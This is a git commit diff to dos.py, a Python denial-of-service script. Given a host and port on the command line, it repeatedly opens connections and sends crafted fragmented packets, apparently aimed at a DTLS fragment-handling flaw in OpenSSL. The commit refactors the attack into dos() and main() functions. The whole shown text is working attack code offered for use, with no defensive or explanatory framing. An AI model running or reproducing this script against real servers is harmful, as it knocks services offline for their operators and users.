e7531c82a8ce6bc979deef521698fb0237c9c2de
Luca Marcelli <luca@marcelli.ch>
2020-01-24 21:15:02 +0100

    more clean!

--- dos.py
+++ dos.py
@@ -10,28 +10,32 @@ def open_socket(host, port):
     sock.connect((host, port))
     return sock
 
-def create_dos_packet():
+def create_dos_packet(fragment_id, length_of_fragment):
     fragment = "A" * 1000
     _buffer = struct.pack(
         "<HHHHH",
         5,                  # id
         len(fragment) + 6,  # full packet
-        i,                  # fragment id
-        i,                  # number of fragments
+        fragment_id,        # fragment id
+        length_of_fragment, # number of fragments
         1000                # length of a fragment
     )
     _buffer += fragment
     return _buffer
 
-if __name__ == "__main__":
-    do_patch() # applies DTLS patches to openssl
-    
-    host = sys.argv[1]
-    port = int(sys.argv[2])
-
+def dos(host, port):
     for i in range(0, 0x1337):
         sock = open_socket(host, port)
         for j in range(0, 4):
-            packet = create_dos_packet()
+            packet = create_dos_packet(i, i)
             sock.write(packet)
         sock.close()
+
+def main():
+    do_patch() # applies DTLS patches to openssl
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    dos(host, port)
+
+if __name__ == "__main__":
+    main()
